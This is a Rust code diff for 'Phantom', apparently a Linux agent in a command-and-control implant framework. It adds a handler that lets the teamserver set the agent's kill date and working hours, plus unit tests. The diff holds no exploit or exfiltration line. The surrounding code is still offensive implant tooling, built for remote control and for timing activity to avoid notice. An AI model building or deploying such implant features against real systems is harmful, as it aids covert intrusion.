@@ -11,8 +11,8 @@ use std::process::Stdio;
 use std::time::{SystemTime, UNIX_EPOCH};
 
 use red_cell_common::demon::{
-    DemonCallback, DemonCommand, DemonFilesystemCommand, DemonNetCommand, DemonPackage,
-    DemonProcessCommand, DemonSocketCommand, DemonSocketType, DemonTransferCommand,
+    DemonCallback, DemonCommand, DemonConfigKey, DemonFilesystemCommand, DemonNetCommand,
+    DemonPackage, DemonProcessCommand, DemonSocketCommand, DemonSocketType, DemonTransferCommand,
 };
 use time::OffsetDateTime;
 use tokio::net::TcpStream as TokioTcpStream;
@@ -47,8 +47,10 @@ pub(crate) struct PhantomState {
     socks_clients: HashMap<u32, SocksClient>,
     downloads: Vec<ActiveDownload>,
     pending_callbacks: Vec<PendingCallback>,
-    /// Kill date set dynamically by the teamserver via `CommandKillDate`.
+    /// Kill date set dynamically by the teamserver via `CommandKillDate` or `CommandConfig`.
     kill_date: Option<i64>,
+    /// Working-hours bitmask set dynamically by the teamserver via `CommandConfig`.
+    working_hours: Option<i32>,
 }
 
 #[derive(Debug)]
@@ -261,6 +263,11 @@ impl PhantomState {
     /// Return the kill date set dynamically by the teamserver, if any.
     pub(crate) fn kill_date(&self) -> Option<i64> {
         self.kill_date
+    }
+
+    /// Return the working-hours bitmask set dynamically by the teamserver, if any.
+    pub(crate) fn working_hours(&self) -> Option<i32> {
+        self.working_hours
     }
 
     /// Set or clear the dynamic kill date (Unix timestamp in seconds).
@@ -798,6 +805,9 @@ pub(crate) async fn execute(
                 text: label,
             });
         }
+        DemonCommand::CommandConfig => {
+            execute_config(package.request_id, &package.payload, state)?;
+        }
         DemonCommand::CommandExit => {
             let mut parser = TaskParser::new(&package.payload);
             let exit_method = u32::try_from(parser.int32()?)
@@ -811,6 +821,88 @@ pub(crate) async fn execute(
             state.queue_callback(PendingCallback::Error {
                 request_id: package.request_id,
                 text: format!("phantom does not implement command {command:?} yet"),
+            });
+        }
+    }
+
+    Ok(())
+}
+
+/// Handle `CommandConfig` (ID 2500): reconfigure live agent parameters.
+///
+/// The payload starts with a config key (u32) followed by key-specific data.
+/// For Linux-relevant keys the value is applied and echoed back as a
+/// [`PendingCallback::Structured`] response.  Windows-only keys are rejected
+/// with an error callback.
+fn execute_config(
+    request_id: u32,
+    payload: &[u8],
+    state: &mut PhantomState,
+) -> Result<(), PhantomError> {
+    let mut parser = TaskParser::new(payload);
+    let raw_key = u32::try_from(parser.int32()?)
+        .map_err(|_| PhantomError::TaskParse("negative config key"))?;
+
+    let key = match DemonConfigKey::try_from(raw_key) {
+        Ok(key) => key,
+        Err(_) => {
+            state.queue_callback(PendingCallback::Error {
+                request_id,
+                text: format!("unknown config key {raw_key}"),
+            });
+            return Ok(());
+        }
+    };
+
+    match key {
+        DemonConfigKey::KillDate => {
+            let kill_date = parser.int64()?;
+            state.kill_date = if kill_date > 0 { Some(kill_date) } else { None };
+
+            let mut response = encode_u32(raw_key);
+            response.extend_from_slice(&encode_u64(u64::try_from(kill_date).unwrap_or_default()));
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandConfig),
+                request_id,
+                payload: response,
+            });
+        }
+        DemonConfigKey::WorkingHours => {
+            let hours = parser.int32()?;
+            let hours_u32 = u32::try_from(hours)
+                .map_err(|_| PhantomError::TaskParse("negative working hours value"))?;
+            state.working_hours = if hours_u32 != 0 {
+                Some(
+                    i32::try_from(hours_u32)
+                        .map_err(|_| PhantomError::TaskParse("working hours overflow"))?,
+                )
+            } else {
+                None
+            };
+
+            let mut response = encode_u32(raw_key);
+            response.extend_from_slice(&encode_u32(hours_u32));
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandConfig),
+                request_id,
+                payload: response,
+            });
+        }
+        // Windows-only configuration keys — not applicable to Linux.
+        DemonConfigKey::ImplantSpfThreadStart
+        | DemonConfigKey::ImplantVerbose
+        | DemonConfigKey::ImplantSleepTechnique
+        | DemonConfigKey::ImplantCoffeeThreaded
+        | DemonConfigKey::ImplantCoffeeVeh
+        | DemonConfigKey::MemoryAlloc
+        | DemonConfigKey::MemoryExecute
+        | DemonConfigKey::InjectTechnique
+        | DemonConfigKey::InjectSpoofAddr
+        | DemonConfigKey::InjectSpawn64
+        | DemonConfigKey::InjectSpawn32 => {
+            state.queue_callback(PendingCallback::Error {
+                request_id,
+                text: format!("config key {key:?} is not supported on Linux"),
             });
         }
     }
@@ -3823,5 +3915,121 @@ mod tests {
         let callbacks = state.drain_callbacks();
         assert_eq!(callbacks.len(), 1);
         assert!(matches!(callbacks[0], PendingCallback::KillDate { request_id: 0 }));
+    }
+
+    // ---- CommandConfig tests ----
+
+    fn config_payload(key: u32, extra: &[u8]) -> Vec<u8> {
+        let mut payload = (key as i32).to_le_bytes().to_vec();
+        payload.extend_from_slice(extra);
+        payload
+    }
+
+    #[tokio::test]
+    async fn config_kill_date_sets_state_and_echoes_back() {
+        let kill_date: i64 = 1_700_000_000;
+        let payload = config_payload(154, &kill_date.to_le_bytes());
+        let package = DemonPackage::new(DemonCommand::CommandConfig, 10, payload);
+        let mut state = PhantomState::default();
+
+        execute(&package, &mut state).await.expect("execute");
+
+        assert_eq!(state.kill_date(), Some(1_700_000_000));
+
+        let callbacks = state.drain_callbacks();
+        let [PendingCallback::Structured { command_id, request_id, payload }] =
+            callbacks.as_slice()
+        else {
+            panic!("unexpected callbacks: {callbacks:?}");
+        };
+        assert_eq!(*command_id, u32::from(DemonCommand::CommandConfig));
+        assert_eq!(*request_id, 10);
+
+        let mut offset = 0;
+        assert_eq!(read_u32(payload, &mut offset), 154);
+        assert_eq!(read_u64(payload, &mut offset), 1_700_000_000);
+    }
+
+    #[tokio::test]
+    async fn config_kill_date_zero_clears_state() {
+        let payload = config_payload(154, &0_i64.to_le_bytes());
+        let package = DemonPackage::new(DemonCommand::CommandConfig, 11, payload);
+        let mut state = PhantomState::default();
+        state.kill_date = Some(1_700_000_000);
+
+        execute(&package, &mut state).await.expect("execute");
+
+        assert_eq!(state.kill_date(), None);
+    }
+
+    #[tokio::test]
+    async fn config_working_hours_sets_state_and_echoes_back() {
+        // Enable flag (bit 22) + start 09:00 (9<<17 | 0<<11) + end 17:00 (17<<6 | 0<<0)
+        let hours: i32 = (1 << 22) | (9 << 17) | (0 << 11) | (17 << 6) | 0;
+        let payload = config_payload(155, &hours.to_le_bytes());
+        let package = DemonPackage::new(DemonCommand::CommandConfig, 12, payload);
+        let mut state = PhantomState::default();
+
+        execute(&package, &mut state).await.expect("execute");
+
+        assert_eq!(state.working_hours(), Some(hours));
+
+        let callbacks = state.drain_callbacks();
+        let [PendingCallback::Structured { command_id, request_id, payload }] =
+            callbacks.as_slice()
+        else {
+            panic!("unexpected callbacks: {callbacks:?}");
+        };
+        assert_eq!(*command_id, u32::from(DemonCommand::CommandConfig));
+        assert_eq!(*request_id, 12);
+
+        let mut offset = 0;
+        assert_eq!(read_u32(payload, &mut offset), 155);
+        assert_eq!(read_u32(payload, &mut offset), hours as u32);
+    }
+
+    #[tokio::test]
+    async fn config_working_hours_zero_clears_state() {
+        let payload = config_payload(155, &0_i32.to_le_bytes());
+        let package = DemonPackage::new(DemonCommand::CommandConfig, 13, payload);
+        let mut state = PhantomState::default();
+        state.working_hours = Some(12345);
+
+        execute(&package, &mut state).await.expect("execute");
+
+        assert_eq!(state.working_hours(), None);
+    }
+
+    #[tokio::test]
+    async fn config_windows_only_key_returns_error() {
+        // InjectTechnique (150) is Windows-only
+        let payload = config_payload(150, &42_i32.to_le_bytes());
+        let package = DemonPackage::new(DemonCommand::CommandConfig, 14, payload);
+        let mut state = PhantomState::default();
+
+        execute(&package, &mut state).await.expect("execute");
+
+        let callbacks = state.drain_callbacks();
+        let [PendingCallback::Error { request_id, text }] = callbacks.as_slice() else {
+            panic!("unexpected callbacks: {callbacks:?}");
+        };
+        assert_eq!(*request_id, 14);
+        assert!(text.contains("not supported on Linux"));
+    }
+
+    #[tokio::test]
+    async fn config_unknown_key_returns_error() {
+        let payload = config_payload(9999, &[]);
+        let package = DemonPackage::new(DemonCommand::CommandConfig, 15, payload);
+        let mut state = PhantomState::default();
+
+        execute(&package, &mut state).await.expect("execute");
+
+        let callbacks = state.drain_callbacks();
+        let [PendingCallback::Error { request_id, text }] = callbacks.as_slice() else {
+            panic!("unexpected callbacks: {callbacks:?}");
+        };
+        assert_eq!(*request_id, 15);
+        assert!(text.contains("unknown config key"));
     }
 }
